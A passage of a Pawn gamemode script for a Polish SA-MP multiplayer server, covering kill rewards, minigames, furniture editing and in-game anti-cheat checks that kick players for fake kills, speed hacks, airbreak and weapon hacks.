		if(TDOn[killerid]) {
		    TextDrawShowForPlayer(killerid, Textdraw[26]);
			PlayerTextDrawShow(killerid, KillInfo[killerid]);
			SetTimerEx("HideKill", 4500, 0, "i", killerid); }
		if(ServerEvent && SEventType == 4) {
			SKills--;
			new tdsestr[256];
			format(SEventName, sizeof(SEventName), "Premia za ostatnie zabojstwo (%d)", SKills);
			format(tdsestr, sizeof(tdsestr), "Event serwera~n~~w~~h~%s~n~~w~~h~Pozostalo ~p~%d ~w~~h~minut", SEventName, SEventTimer);
			TextDrawSetString(Textdraw[10], tdsestr);
			new formatse[256];
			format(formatse, sizeof(formatse), "Event serwera~n~~w~~h~%s~n~~w~~h~Pozostalo ~p~%d ~w~~h~minut", SEventName, SEventTimer);
			TextDrawSetString(Textdraw[10], formatse);
	    	if(SKills == 0) {
	    	    AddExp(killerid, 500);
	        	ServerEvent = false;
	        	SEventType = -1;
	        	SendClientMessage(killerid, -1, "{ce93ff}Gratulacje! Otrzymujesz premiê za ostatnie zabójstwo!");
	        	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && TDOn[loopid]) HideSEvent(loopid); } } } }
	    if(49 <= reason <= 50 && !Suicided[playerid])
	    {
	        if(OnGame[killerid] != -1) WypiszZabawa(killerid);
			switch(reason) {
				case 49: JailPlayer("Serwer", killerid, "CK/HK", 120);
				case 50: JailPlayer("Serwer", killerid, "CK/HK", 120); }
		}
	if(OnGame[killerid] == GG && Wystartowala[GG] && killerid != INVALID_PLAYER_ID)
	{
		ResetPlayerWeapons(killerid);
		GGLevel[killerid]++;
		new killstr[256];
		if(GGLevel[killerid] < 10) {
			if(!ENMode[killerid]) format(killstr, sizeof(killstr), ""C_YELLOW"Awansowa³eœ na poziom "C_WHITE"%d/9"C_YELLOW".", GGLevel[killerid]);
			else format(killstr, sizeof(killstr), ""C_YELLOW"You are promoted to level "C_WHITE"%d/9"C_YELLOW".", GGLevel[killerid]);
			SendClientMessage(killerid, -1, killstr); }
		if(GGLevel[killerid] == 1) return GivePlayerWeapon(killerid, 22, 7999);
		if(GGLevel[killerid] == 2) return GivePlayerWeapon(killerid, 23, 7999);
		if(GGLevel[killerid] == 3) return GivePlayerWeapon(killerid, 33, 7999);
		if(GGLevel[killerid] == 4) return GivePlayerWeapon(killerid, 25, 7999);
		if(GGLevel[killerid] == 5) return GivePlayerWeapon(killerid, 34, 7999);
		if(GGLevel[killerid] == 6) return GivePlayerWeapon(killerid, 31, 7999);
		if(GGLevel[killerid] == 7) return GivePlayerWeapon(killerid, 18, 7999);
		if(GGLevel[killerid] == 8) return GivePlayerWeapon(killerid, 24, 7999);
		if(GGLevel[killerid] == 9) return GivePlayerWeapon(killerid, 38, 9999);
		if(GGLevel[killerid] == 10) {
  			AddExp(killerid, 200);
    		Player[killerid][Cash] += 20000;
    		new msgstr[256];
    		format(msgstr, sizeof(msgstr), ""PYTAJNIK""C_NICK"%s(%d) "C_ZABAWA"wygrywa zabawê "C_WHITE"/GG"C_ZABAWA".", Player[killerid][Name], killerid);
    		SendClientMessageToAll(-1, msgstr);
    		Player[killerid][Zabawyp]++;
    		if(pAch[killerid][18] < 1) {
    		    if(Player[playerid][Zabawyp] >= 100 && pAch[killerid][18] < 1) {
					pAch[killerid][18] = 1;
					AddExp(killerid, 200);
					Sound(killerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (1)", "New achievement: "C_NICK"Imprezowicz (1)"); }
    		    if(Player[playerid][Zabawyp] >= 250 && pAch[killerid][18] < 2) {
					pAch[killerid][18] = 2;
					AddExp(killerid, 400);
					Sound(killerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (2)", "New achievement: "C_NICK"Imprezowicz (2)"); }
			  	if(Player[playerid][Zabawyp] >= 500 && pAch[killerid][18] < 3) {
					pAch[killerid][18] = 3;
					AddExp(killerid, 600);
					Sound(killerid,1137,0.0,0.0,0.0);
					SendClientMessageEx(killerid, -1, "Nowe osi¹gniêcie: "C_NICK"Imprezowicz (3)", "New achievement: "C_NICK"Imprezowicz (3)"); } }
			GG_End(); }
	}
	fakekills[killerid]++;
	SetTimerEx("RemoveFK", 750, 0, "i", killerid);
	if(NaSpedycji[playerid]) ForceEndSpedycja(playerid);
	if(fakekills[playerid] > 2) {
	    new msgs[256], msgsen[256];
	    format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
	    format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
		SendClientMessageToAllEx(RED, msgs, msgsen);
		DelayedKick(playerid);
		return kicks++; }
    if(killerid == playerid)
    {
        new msgs[256], msgsen[256];
	   	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
	   	format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
		SendClientMessageToAllEx(RED, msgs, msgsen);
		DelayedKick(playerid);
		return kicks++;
    }
    if(DamageTaken[playerid] == 1) { SetTimerEx("DamageTimer", 10, false, "i", playerid); }
    if(pArena[killerid] == 1) Player[killerid][A1]++;
    if(pArena[killerid] == 2) Player[killerid][A2]++;
    if(pArena[killerid] == 3) Player[killerid][A3]++;
    if(pArena[killerid] == 4) Player[killerid][A4]++;
    if(pArena[killerid] == 5) Player[killerid][A5]++;
    if(pArena[killerid] == 6) Player[killerid][A6]++;
    if(pArena[killerid] == 7) Player[killerid][A7]++;
    if(pArena[killerid] == 8) Player[killerid][A8]++;
	ClanStrefa[playerid] = false; 
	ClanPatriot[playerid] = false; 
	if(Attacker[playerid]) wattackers--;
	if(Deffender[playerid]) wdeffenders--;
	if(Wystartowala[CH])
	{
	    if(OnGame[playerid] == CH)
	    {
	        WypiszZabawa(playerid);
	    }
	}
	if(Wystartowala[DB])
	{
	    if(OnGame[playerid] == DB)
	    {
	        WypiszZabawa(playerid);
	    }
	}
	if(OnGame[playerid] == -1) SendDeathMessage(killerid, playerid, reason);
  Loop(loopid, MAX_PLAYERS) {
    if(LastDamaged[loopid] == playerid && loopid != playerid && loopid != killerid) {
      if(TakedDamage[loopid] > 30) {
        AddExp(loopid, 2);
        Player[loopid][Cash] += 100;
        new assistmsg[256];
        if(!ENMode[playerid]) format(assistmsg, sizeof(assistmsg), "{969696}Otrzymujesz "C_WHITE"2 EXP {969696}za asystê przy zabiciu "C_WHITE"%s{969696}.", Player[playerid][Name]);
        else format(assistmsg, sizeof(assistmsg), "{969696}You received "C_WHITE"2 EXP {969696}for assist with "C_WHITE"%s{969696} killing.", Player[playerid][Name]);
        SendClientMessage(loopid, -1, assistmsg);
        TakedDamage[loopid] = 0;
        LastDamaged[loopid] = -1; }
    }
  }
	if(TakedDamage[killerid] > 80) {
    Player[killerid][Cash] += 200;
	   AddExp(killerid, 3); }
  if(TakedDamage[killerid] > 50 && TakedDamage[killerid] < 81) {
    Player[killerid][Cash] += 100;
    AddExp(killerid, 2); }
  if(TakedDamage[killerid] > 0 && TakedDamage[killerid] < 51) {
    Player[killerid][Cash] += 50;
    AddExp(killerid, 1); }
  LastDamaged[killerid] = -1;
  TakedDamage[killerid] = 0;
	if(GetPlayerWeapon(killerid) == gunday && SEventType == 0 && ServerEvent) {
		Player[killerid][Cash] += 1000;
		AddExp(killerid, 3); }
  	Loop(loopid, MAX_PLAYERS)
   	{
    	if(pEnemy[loopid] == playerid && pEnemy[playerid] == loopid && pFight[playerid] && pFight[loopid] && pEnemy[playerid] != -1 && pEnemy[loopid] != -1)
     	{
			ResetPlayerWeapons(playerid);
			ResetPlayerWeapons(loopid);
	   		SetPlayerInterior(playerid, 0);
	   		SetPlayerInterior(loopid, 0);
	   		SetPlayerVirtualWorld(playerid, 0);
	   		SetPlayerVirtualWorld(loopid, 0);
	    	pFight[loopid] = false;
	    	pFight[playerid] = false;
	    	pEnemy[playerid] = -1;
	    	pEnemy[loopid] = -1;
	    	AddExp(loopid, 30);
	   		Player[playerid][Exp] -= 10;
	   		if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
	   		Player[loopid][Solo]++;
	   		new solomsg[256], solomsgen[256];
	   		format(solomsg, sizeof(solomsg), ""C_NICK"%s(%d) {CCFF33}wygrywa pojedynek solo z "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
	   		format(solomsgen, sizeof(solomsgen), ""C_NICK"%s(%d) {CCFF33}won solo battle with "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
			SendClientMessageToAllEx(-1, solomsg, solomsgen);
			SetPlayerHealth(playerid, 100.0);
			SetPlayerArmour(playerid, 100.0);
			SpawnFunction(playerid);
			SpawnFunction(loopid);
	    }
	}
	if(NaWojnie[playerid]) NaWojnie[playerid] = false;
	if(killerid != INVALID_PLAYER_ID && OnGame[killerid] == -1)
	{
		if(Player[playerid][Hitman] > 0)
		{
    		new msgs[256];
 			format(msgs, sizeof(msgs), "{25CFED}Gracz "C_WHITE"%s(%d) {25CFED}zdoby³ "C_WHITE"%d EXP {25cFED}za zabicie gracza "C_WHITE"%s(%d){25CFED}.", Player[killerid][Name], killerid, Player[playerid][Hitman], Player[playerid][Name], playerid);
 			SendClientMessageToAll(WHITE, msgs);
 			AddExp(killerid, Player[playerid][Hitman]);
			Player[playerid][Hitman] = 0;
		}
		if(DamageTaken[playerid] == 0)
		{
		    new msgs[256], msgsen[256];
		    format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
		    format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Fake Kill"C_RED")", Player[playerid][Name], playerid);
			SendClientMessageToAllEx(RED, msgs, msgsen);
			DelayedKick(playerid);
			return kicks++;
		}
    }
    GangScoreUpdate(playerid, killerid);
    if(OnNonDM[playerid] && !Suicided[playerid]) return JailPlayer("Serwer", killerid, "Zabójstwo w strefie bez DM", 120);
	return 1;
}

public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float: x, Float: y, Float: z)
{
	switch(GetPVarInt(playerid, "HouseSelectMode"))
	{
	    case SELECT_MODE_EDIT: EditDynamicObject(playerid, objectid);
	    case SELECT_MODE_SELL:
	    {
	        CancelEdit(playerid);
			new data[e_furniture], string[255];
			SetPVarInt(playerid, "SelectedFurniture", objectid);
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);

			format(string, sizeof(string), ""C_BLUE1"Czy na pewno chcesz sprzedaæ "C_WHITE"%s"C_BLUE1"?\n"C_BLUE1"Za u¿ywany przedmiot dostaniesz "C_WHITE"%d EXP"C_BLUE1".", HouseFurnitures[data[ArrayID]][Name], floatround(HouseFurnitures[data[ArrayID]][Price] * 0.85));
			ShowPlayerDialog(playerid, DIALOG_DOM_13, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Sprzeda¿ dodatków", string, "Sprzedaj", "Zamknij");
		}
	}

	return 1;
}

public OnPlayerEditDynamicObject(playerid, objectid, response, Float: x, Float: y, Float: z, Float: rx, Float: ry, Float: rz)
{
	switch(response)
	{
	    case EDIT_RESPONSE_CANCEL:
	    {
	        new data[e_furniture];
	        Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
	        SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
	        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);
	    }

		case EDIT_RESPONSE_FINAL:
		{
		    new data[e_furniture];
		    Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
		    data[furnitureX] = x;
		    data[furnitureY] = y;
		    data[furnitureZ] = z;
            data[furnitureRX] = rx;
            data[furnitureRY] = ry;
            data[furnitureRZ] = rz;
            SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
	        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);
	        Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);

	        m_query("UPDATE housefurnitures SET FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureRX=%f, FurnitureRY=%f, FurnitureRZ=%f WHERE ID=%d", data[furnitureX], data[furnitureY], data[furnitureZ], data[furnitureRX], data[furnitureRY], data[furnitureRZ], data[SQLID]);
		}
	}

	return 1;
}

stock IsATrain(vehicleid)
{
    switch(GetVehicleModel(vehicleid))
    {
        case 449,537,538,569,570,590: return 1;
    }
    return 0;
}

stock IsAPlane(vehicleid)
{
    switch(GetVehicleModel(vehicleid))
    {
        case 460,464,476,511,512,513,519,520,553,577,592,593: return 1;
    }
    return 0;
}

forward AntiSpeedHack();
public AntiSpeedHack()
{
	foreach (new i : Player)
 	{
 		new Float:currentspeed = GetPlayerSpeed(i);
        if(currentspeed > 450)
        {
    		new tmpcar = GetPlayerVehicleID(i), surf = GetPlayerSurfingVehicleID(i);
        	if(!IsAPlane(tmpcar) && !(GetPlayerState(i) == PLAYER_STATE_PASSENGER) && !(IsATrain(tmpcar)) && surf == INVALID_VEHICLE_ID)
        	{
        		new sendername[MAX_PLAYER_NAME];
        		GetPlayerName(i, sendername, sizeof(sendername));
        		new vehicleid = GetPlayerVehicleID(i);
        		new Float:hp; GetVehicleHealth(vehicleid, hp);
        		SpeedWarnings[i]++;
        		if(SpeedWarnings[i] >= 3)
        		{
        		    new msgs[256];
		    		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Speed Hack"C_RED")", i, Player[i][Name]);
					SendClientMessageToAll(RED, msgs);
					DelayedKick(i);
					kicks++;
      				SpeedWarnings[i] = 0;
      			}
       		}
		}
	}
}

public OnPlayerSuspectedForAimbot(playerid, hitid, weaponid, warnings)
{
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"jest podejrzany o posiadanie "C_WHITE"Aimbota"C_RED".", Player[playerid][Name], playerid);
	Loop(loopid, MAX_PLAYERS) { if(Player[loopid][Admin] > 0) SendClientMessage(loopid, RED, msgs); }
	return 1;
}

public OnPlayerAirbreak(playerid)
{
	if(GetPlayerInterior(playerid) == 1) return 1;
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Air Break"C_RED")", Player[playerid][Name], playerid);
	SendClientMessageToAll(RED, msgs);
	DelayedKick(playerid);
	return kicks++;
}

forward CheckNoDM(playerid);
public CheckNoDM(playerid)
{
	new pnodm = 0;
    new weapon = GetPlayerWeapon(playerid);
	Loop(nodm, CreatedNODM)
	{
	    if(IsPlayerInArea(playerid, nDMMinX[nodm], nDMMinY[nodm], nDMMaxX[nodm], nDMMaxY[nodm]) && !GetPlayerVirtualWorld(playerid))
	    {
	        pnodm++;
	       	if(IsPlayerInArea(playerid, -1526.4622,-2441.4561,-1213.4259,-2174.9136) && weapon != 6) GivePlayerWeapon(playerid, 6, 1);
	        if(!IsPlayerInArea(playerid, -1526.4622,-2441.4561,-1213.4259,-2174.9136)) SetPlayerArmedWeapon(playerid,0);
	        if(!OnNonDM[playerid])
	        {
	            OnNonDM[playerid] = true;
	            return SetPlayerHealth(playerid, 100.0);
	        }
	    }
	    else
	    {
	        if(OnNonDM[playerid] && pnodm < 1) OnNonDM[playerid] = false;
	    }
	}
	return 1;
}

public OnVehicleMod(playerid,vehicleid,componentid) {
    if(GetPlayerInterior(playerid) == 0) return 0;
    return 1;
}

forward WeaponsH(playerid);
public WeaponsH(playerid) {
	if(GetPlayerWeapon(playerid) != 24 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 1) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 31 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 2) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 17 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 3) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 18 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 4) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 26 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 5) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 25 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 6) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 34 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 7) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	if(GetPlayerWeapon(playerid) != 35 && GetPlayerWeapon(playerid) != 0 && pArena[playerid] == 8) {
		new msgs[256], msgsen[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		format(msgsen, sizeof(msgsen), ""C_NICK"%s(%d) "C_RED"kicked ("C_WHITE"Weapon Hack"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAllEx(RED, msgs, msgsen);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	return 1; }

public OnPlayerUpdate(playerid)
{
  new Float:x, Float:y, Float:z;
  GetPlayerPos(playerid, x, y, z);
  if(x != LastX[playerid] || y != LastY[playerid] || z != LastZ[playerid]) {
    AFKPoints[playerid] = 100;
    LastX[playerid] = x;
    LastY[playerid] = y;
    LastZ[playerid] = z;
  }
  if(GetPlayerWeapon(playerid) > 0 && SpawnTimer[playerid] > 0) SetPlayerArmedWeapon(playerid, 0);
  if(IsPlayerInAnyVehicle(playerid) && GetPlayerWeapon(playerid) != 0) {
    new vehicleid = GetPlayerVehicleID(playerid);
    new modelid = GetVehicleModel(vehicleid);
    if(modelid == 522 || modelid == 523 || modelid == 521 || modelid == 461 || modelid == 463 || modelid == 581) {
      GivePlayerWeapon(playerid, 0, 1);
      SetPlayerArmedWeapon(playerid, 0); }
  }
  if(z > 20.3 && TRRundaTrwa && OnGame[playerid] == TR && Wystartowala[TR] && !WykonalTR[playerid] && TRType == 0) {
    WykonalTR[playerid] = true;
    PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); }
  new Float:speed = GetPlayerSpeed(playerid);
  if(speed < 1 && TRRundaTrwa && OnGame[playerid] == TR && Wystartowala[TR] && !WykonalTR[playerid] && TRType == 3) {
    WykonalTR[playerid] = true;
    PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); }
  if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_DUCK && TRRundaTrwa && OnGame[playerid] == TR && Wystartowala[TR] && !WykonalTR[playerid] && TRType == 4) {
    WykonalTR[playerid] = true;
    PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    GameTextForPlayer(playerid, "~g~~h~~h~ZADANIE WYKONANE!", 4000, 3); }
	AFKTimer[playerid] = 0;
	AFK[playerid] = false;
	new Float:crashX, Float:crashY, Float:crashZ;
	GetPlayerPos(playerid, crashX, crashY, crashZ);
	if(crashZ > 20000 || crashX > 20000.0000 || crashY > 20000.0000 || crashX < -20000.0000 || crashY < -20000.0000 && !IsDead[playerid]) {
	   	new msgs[256];
		format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Crasher C"C_RED")", Player[playerid][Name], playerid);
		if(!KickMsg[playerid]) SendClientMessageToAll(RED, msgs);
		KickMsg[playerid] = true;
		DelayedKick(playerid);
		return kicks++; }
	Loop(loopid, MAX_PLAYERS)
	{
  		if(IsPlayerInRangeOfPoint(loopid, 30.0, crashX, crashY, crashZ) && loopid != playerid && !GetPlayerVirtualWorld(playerid) && !GetPlayerInterior(playerid))
		{
		   	new currentveh = GetPlayerVehicleID(loopid);
			new currentvehid = GetVehicleModel(currentveh);
			if(IsAPlane(currentveh) || currentvehid == 539) {
				if(Crasher[loopid] != playerid)
				{
					if(Crashed[loopid] < 1) {
						LastWorld[loopid] = GetPlayerVirtualWorld(playerid); }
					SetPlayerVirtualWorld(loopid, 4199);
					Crashed[loopid]++;
					SetPlayerVirtualWorld(loopid, LastWorld[loopid]);
				}
		       	Crasher[loopid] = playerid; }
	    }
	}
	if(IsPlayerInAnyVehicle(playerid))
 	{
 	    new crstate;
 	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) crstate = 0;
 	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) crstate = 1;
	 	if(GetPlayerState(playerid) == PLAYER_STATE_PASSENGER) crstate = 2;
	 	if(LastState[playerid] != crstate)
	 	{
	 	    LastState[playerid] = crstate;
  			pVehicles[playerid]++;
    		SetTimerEx("VehicleEnterReset", 3000, 0, "i", playerid);
     		if(pVehicles[playerid] >= MAX_ENTER_VEHICLES && GetPlayerVirtualWorld(playerid) != 1718) {
    			new msgs[256];
				format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"wyrzucony ("C_WHITE"Car Spam"C_RED")", Player[playerid][Name], playerid);
				if(!KickMsg[playerid]) SendClientMessageToAll(RED, msgs);
				KickMsg[playerid] = true;
 				LastState[playerid] = 0;
				DelayedKick(playerid);
				return kicks++; }
		}
	}
    if (GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
    {
        new Float:vec[3];
        GetPlayerCameraFrontVector(playerid, vec[0], vec[1], vec[2]);
        for (new i = 0; i < sizeof(vec); i++)
            if (floatabs(vec[i]) > 10.0)
                return 0;
    }
	if(OnNonDM[playerid] && GetPVarInt(playerid, "player_objected")) ForceObj(playerid);
	if(GetPVarInt(playerid, "UsedUFO") != 0 && GetPlayerVirtualWorld(playerid)) ResetUFO(playerid);
        if (GetPVarInt(playerid, "laser")) {
                RemovePlayerAttachedObject(playerid, 3);
                if ((IsPlayerInAnyVehicle(playerid)) || (IsPlayerInWater(playerid)) || GetPlayerVirtualWorld(playerid)) return 1;
                switch (GetPlayerWeapon(playerid)) {
                        case 23: {
                                if (IsPlayerAiming(playerid)) {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SP standing aiming
                                                0.108249, 0.030232, 0.118051, 1.468254, 350.512573, 364.284240);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SP crouched aiming
                                                0.108249, 0.030232, 0.118051, 1.468254, 349.862579, 364.784240);
                                        }
                                } else {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SP standing not aiming
                                                0.078248, 0.027239, 0.113051, -11.131746, 350.602722, 362.384216);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SP crouched not aiming
                                                0.078248, 0.027239, 0.113051, -11.131746, 350.602722, 362.384216);
                        }       }       }
                        case 27: {
                                if (IsPlayerAiming(playerid)) {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SPAS standing aiming
                                                0.588246, -0.022766, 0.138052, -11.531745, 347.712585, 352.784271);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SPAS crouched aiming
                                                0.588246, -0.022766, 0.138052, 1.468254, 350.712585, 352.784271);
                                        }
                                } else {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SPAS standing not aiming
                                                0.563249, -0.01976, 0.134051, -11.131746, 351.602722, 351.384216);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // SPAS crouched not aiming
                                                0.563249, -0.01976, 0.134051, -11.131746, 351.602722, 351.384216);
                        }       }       }
                        case 30: {
                                if (IsPlayerAiming(playerid)) {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // AK standing aiming
                                                0.628249, -0.027766, 0.078052, -6.621746, 352.552642, 355.084289);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // AK crouched aiming
                                                0.628249, -0.027766, 0.078052, -1.621746, 356.202667, 355.084289);
                                        }
                                } else {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // AK standing not aiming
                                                0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // AK crouched not aiming
                                                0.663249, -0.02976, 0.080051, -11.131746, 358.302734, 353.384216);
                        }       }       }
                        case 31: {
                                if (IsPlayerAiming(playerid)) {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // M4 standing aiming
                                                0.528249, -0.020266, 0.068052, -6.621746, 352.552642, 355.084289);
                                        } else {
                                                SetPlayerAttachedObject(playerid, 3, GetPVarInt(playerid, "color"), 6, // M4 crouched aiming
                                                0.528249, -0.020266, 0.068052, -1.621746, 356.202667, 355.084289);
                                        }
                                } else {
                                        if (GetPlayerSpecialAction(playerid) != SPECIAL_ACTION_DUCK) {
